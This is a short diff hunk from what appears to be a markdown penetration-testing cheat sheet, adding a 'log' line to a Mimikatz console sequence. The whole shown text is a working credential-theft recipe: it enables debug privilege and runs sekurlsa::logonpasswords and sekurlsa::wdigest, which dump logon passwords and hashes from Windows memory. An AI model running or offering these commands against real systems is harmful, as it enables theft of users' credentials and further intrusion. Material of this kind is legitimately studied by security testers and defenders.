@@ -33,6 +33,7 @@ Mimikatz console (multiple commands)
 ```powershell
 PS C:\temp\mimikatz> .\mimikatz
 mimikatz # privilege::debug
+mimikatz # log
 mimikatz # sekurlsa::logonpasswords
 mimikatz # sekurlsa::wdigest
 ```
